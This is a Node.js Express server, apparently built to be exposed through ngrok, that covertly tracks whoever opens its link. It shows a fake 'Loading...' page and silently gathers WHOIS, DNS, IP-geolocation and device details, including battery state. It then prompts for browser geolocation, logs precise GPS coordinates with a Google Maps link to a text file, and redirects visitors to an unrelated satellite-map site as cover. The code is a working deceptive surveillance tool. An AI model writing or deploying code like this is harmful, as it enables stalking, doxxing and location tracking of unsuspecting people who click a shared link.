const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const whois = require('whois-json');
const useragent = require('useragent');

const app = express();
const port = 3000; // Port to match ngrok configuration

// Continent mapping based on country code
const continentMapping = {
    "AF": "Africa",
    "AS": "Asia",
    "EU": "Europe",
    "NA": "North America",
    "SA": "South America",
    "OC": "Oceania",
    "AN": "Antarctica",
    "US": "North America", // Added mapping for US
};

// Track logged IP addresses
const loggedIps = new Set();
const ipInfoMap = new Map();

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

app.use(express.json());

// Middleware to log IP address details
app.use(async (req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const normalizedIp = ip.split(',')[0].trim();

    if (!loggedIps.has(normalizedIp)) {
        loggedIps.add(normalizedIp);

        try {
            // Perform reverse DNS lookup
            const reverseDnsResponse = await axios.get(`https://dns.google/resolve?name=${normalizedIp}&type=NS`);
            const reverseDnsData = reverseDnsResponse.data;

            // Perform WHOIS lookup using whois-json
            const whoisData = await whois(normalizedIp);

            // Perform IP geolocation lookup using ip-api.com
            const geoResponse = await axios.get(`http://ip-api.com/json/${normalizedIp}`);
            const geoData = geoResponse.data;

            // Perform country data lookup using restcountries.com
            const countryResponse = await axios.get(`https://restcountries.com/v3.1/alpha/${geoData.countryCode}`);
            const countryData = countryResponse.data[0];

            // Determine continent based on country code
            const continent = continentMapping[geoData.countryCode] || 'Not available';

            // Store IP info for later use
            const ipInfo = {
                ip: normalizedIp,
                whoisData,
                reverseDnsData,
                geoData,
                countryData,
                continent
            };

            ipInfoMap.set(normalizedIp, ipInfo);
        } catch (err) {
            console.error('Error performing lookup:', err);
        }
    }

    next(); // Continue to the next middleware or route handler
});

// Handle redirect to devicee.html after 1 second
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Loading...</title>
            <style>
                body {
                    background-color: black;
                    color: white;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    font-family: Arial, sans-serif;
                }
            </style>
            <script>
                function redirect() {
                    setTimeout(function() {
                        window.location.href = 'devicee.html';
                    }, 1000);
                }

                window.onload = function() {
                    redirect();
                }
            </script>
        </head>
        <body>
            <p>Loading...</p>
        </body>
        </html>
    `);
});

// Serve the devicee.html file
app.get('/devicee.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/devicee.html'));
});

// Handle logging of device information and redirect to permissions.html
app.post('/save_device_info', async (req, res) => {
    const deviceInfo = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const normalizedIp = ip.split(',')[0].trim();

    const ipInfo = ipInfoMap.get(normalizedIp);

    if (ipInfo) {
        const agent = useragent.parse(deviceInfo.userAgent);
        const browserName = agent.family;

        const logEntry = `
===============================
Date: ${new Date().toISOString()}
IP Address: ${normalizedIp}
===============================
WHOIS LOOKUP
===============================
${ipInfo.whoisData ? JSON.stringify(ipInfo.whoisData, null, 2) : 'Error retrieving WHOIS information'}
===============================
DNS LOOKUP
===============================
${ipInfo.reverseDnsData ? JSON.stringify(ipInfo.reverseDnsData, null, 2) : 'Error retrieving DNS information'}
===============================
GEOLOCATION LOOKUP
===============================
Continent: ${ipInfo.continent}
Country: ${ipInfo.geoData.country || 'Not available'}
Region: ${ipInfo.geoData.regionName || 'Not available'}
City: ${ipInfo.geoData.city || 'Not available'}
Latitude/Longitude: ${ipInfo.geoData.lat} / ${ipInfo.geoData.lon}
Zip Code: ${ipInfo.geoData.zip || 'Not available'}
Time Zone: ${ipInfo.geoData.timezone || 'Not available'}
ISP: ${ipInfo.geoData.isp || 'Not available'}
Org: ${ipInfo.geoData.org || 'Not available'}
AS: ${ipInfo.geoData.as || 'Not available'}
===============================
IP RELATED INFO
===============================
Continent Latitude/Longitude: ${ipInfo.geoData.lat} / ${ipInfo.geoData.lon}
Country Latitude/Longitude: ${ipInfo.geoData.lat} / ${ipInfo.geoData.lon}
Language: ${ipInfo.countryData.languages ? Object.values(ipInfo.countryData.languages).join(', ') : 'Not available'}
Currency: ${ipInfo.countryData.currencies ? Object.values(ipInfo.countryData.currencies).map(c => c.name).join(', ') : 'Not available'}
===============================
Device Information:
User Agent: ${deviceInfo.userAgent}
Platform: ${deviceInfo.platform}
App Name: ${deviceInfo.appName}
App Version: ${deviceInfo.appVersion}
Cookies Enabled: ${deviceInfo.cookiesEnabled}
Browser Name: ${browserName}
Battery Level: ${deviceInfo.batteryInfo.level || 'Not available'}
Charging: ${deviceInfo.batteryInfo.charging || 'Not available'}
===============================
`;

        try {
            await fs.promises.appendFile(path.join(__dirname, 'logs.txt'), logEntry);
            res.redirect('/permissions.html'); // Redirect after logging
        } catch (err) {
            console.error('Error logging device information:', err);
            res.status(500).send('Error logging device info');
        }
    } else {
        res.status(500).send('IP info not available');
    }
});

// Handle redirect to permissions.html
app.get('/permissions.html', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Permissions</title>
            <script>
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(saveLocation);
                    } else {
                        document.getElementById('result').innerText = "Geolocation is not supported by this browser.";
                    }
                }

                function saveLocation(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    fetch('/save-location?lat=' + lat + '&lon=' + lon)
                        .then(response => {
                            // Redirect after saving location
                            window.location.href = "https://satellite-map.com/m/?gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiPka5Y8pO6Ag4OKa7RDm8BkBcvhsXXnLoe5DPCGr_AdleT6aiGZEpRoCPikQAvD_BwE";
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            document.getElementById('result').innerText = "Error saving location.";
                        });
                }

                window.onload = function() {
                    getLocation();
                }
            </script>
        </head>
        <body>
            <p>Getting location...</p>
            <div id="result"></div>
        </body>
        </html>
    `);
});

// Handle saving of GPS location
app.get('/save-location', (req, res) => {
    const lat = req.query.lat;
    const lon = req.query.lon;

    if (lat && lon) {
        // Construct Google Maps URL
        const googleMapsURL = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
        const logEntry = `Latitude: ${lat}\nLongitude: ${lon}\nGoogle Maps URL: ${googleMapsURL}\n\n`;

        // Save location and URL to logs.txt
        fs.appendFile(path.join(__dirname, 'logs.txt'), logEntry, (err) => {
            if (err) {
                console.error(err);
                res.status(500).send('Error saving location');
                return;
            }
            res.status(200).end(); // End the response without sending any message
        });
    } else {
        res.status(400).send('Missing lat or lon');
    }
});

app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
